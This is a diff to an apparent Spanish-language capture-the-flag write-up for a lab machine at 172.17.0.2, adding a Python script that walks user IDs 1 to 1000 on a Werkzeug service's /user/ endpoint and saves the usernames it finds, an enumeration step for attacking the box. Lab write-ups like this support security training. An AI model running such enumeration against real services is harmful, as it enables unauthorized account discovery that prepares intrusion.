@@ -56,4 +56,93 @@ Nmap done: 1 IP address (1 host up) scanned in 11.85 seconds
 
 Vemos que tenemos Openssh 9.2p1 por ahí no podemos hacer mucho vamos a acceder desde el navegador al puerto 12345 donde corre Werkzeug
 
+<pre>
+  <code>
+    #!/usr/bin/env python3
+    # Creador: wvverez
+    # https://github.com/wvverez
+    
+import requests
+import sys
+import os
+import time
 
+# Colores (A gusto)
+RED = '\033[1;31m'
+GREEN = '\033[1;32m'
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+MAGENTA = '\033[1;35m'
+CYAN = '\033[1;36m'
+RESET = '\033[0m'
+
+BASE_URL = "http://172.17.0.2:12345/user/"
+OUTPUT_FILE = "usuarios.txt"
+
+def obtener_usuarios():
+    usuarios = []
+    max_id = 1000  # Para que no sea infinito no creo que haya más de aquí.
+    print(f"{CYAN}[*] Buscando los usuarios...{RESET}")
+    print(f"{RED}{'-' * 40}{RESET}")
+    print(f"{RED} [*] Author: Wvverez{RESET}")
+    print(f"{RED} [*] https://github.com/wvverez{RESET}")
+    print(f"{RED} [*] Descubrimiento de usuarios...{RESET}")
+    print(f"{RED}{'-' * 40}{RESET}")
+    
+    for user_id in range(1, max_id + 1):
+        try:
+            response = requests.get(f"{BASE_URL}{user_id}", timeout=5)
+            if response.status_code == 200:
+                data = response.json()
+                username = data.get("username")
+                if username:  # Corregido: "usernamme" -> "username"
+                    usuarios.append(username)
+                    print(f"{GREEN}[*] Usuarios encontrado: {username}{RESET}")
+                    time.sleep(1)
+                else:
+                    print(f"{YELLOW}[!] No se encontró nombre de usuario{RESET}")
+            elif response.status_code == 404:
+                # Aquí basicamente lo que hacemos es que si encontramos un 404, no hay más usuarios.
+                print(f"{RED}[!] No se encontraron nombres de usuarios {RESET}")
+                break
+            else:
+                print(f"{RED}[!] Error HTTP en ID {user_id}: {response.status_code}{RESET}")
+                time.sleep(5)
+        except requests.RequestException as e:
+            print(f"{RED}[!] Error en la solicitud para ID {user_id}: {str(e)}{RESET}")
+            break
+    
+    print(f"{YELLOW}{'-' * 40}{RESET}")
+    return usuarios
+
+def guardar_usuarios(usuarios):
+    try:
+        with open(OUTPUT_FILE, "w", encoding="utf-8") as file:  # Corregido: {OUTPUT_FILE} -> OUTPUT_FILE
+            for username in usuarios:
+                file.write(username + "\n")
+        print(f"{GREEN}[*] Usuarios guardados en {OUTPUT_FILE}{RESET}")
+    except IOError as e:
+        print(f"{RED}[!] Error al guardar el archivo: {str(e)}{RESET}")
+
+def main():
+    usuarios = obtener_usuarios()
+    if usuarios:
+        while True:
+            print(f"{BLUE}[*] Quieres guardar el reporte en usuarios.txt? (s/n): {RESET}", end="")
+            respuesta = input().lower()
+            if respuesta in ['s', 'si', 'sí']:
+                guardar_usuarios(usuarios)
+                break
+            elif respuesta in ['n', 'no']:
+                print(f"{RED}[!] Por favor, responda 's' o 'n'. {RESET}")
+                break  # Corregido: añadido break para salir del bucle
+            else:
+                print(f"{RED}[!] No encuentra usuarios pa guardar{RESET}")
+    else:
+        print(f"{RED}[!] No se encontraron usuarios para guardar{RESET}")  # Mensaje mejorado
+
+if __name__ == "__main__":
+    main()
+
+  </code>
+</pre>
